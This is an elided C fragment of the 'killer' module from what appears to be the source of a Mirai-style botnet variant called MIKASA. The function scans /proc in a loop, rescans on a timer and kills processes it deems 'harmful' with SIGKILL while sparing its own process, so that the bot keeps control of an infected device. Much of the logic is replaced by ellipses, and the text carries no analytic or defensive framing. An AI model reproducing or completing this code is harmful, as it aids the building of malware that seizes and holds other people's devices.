...
void killer_init(void)
{
...
#ifdef DEBUG
    printf("(MIKASA_KILLER) cmdline killer started, scanning for bad processes!\n");
#endif
    ...
    while (TRUE)
    {
        ...
        {
#ifdef DEBUG
            printf("(MIKASA_KILLER) failed to open /proc!\n");
#endif
            break;
        }
        ...
        while ((file = readdir(dir)) != NULL)
        {
            ...
            if (pid <= killer_highest_pid)
            {
                ...
                {
#ifdef DEBUG
                    printf("(MIKASA_KILLER) %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
#endif
            ...
            if(pid != getpid() && pid != getppid() && pid != getpid() + 1)
            {
                ...
                {
#ifdef DEBUG
                    printf("(MIKASA_KILLER) killing harmful process: %s\n", cmdline_path);
#endif
                    kill(pid, 9);
                }
            }
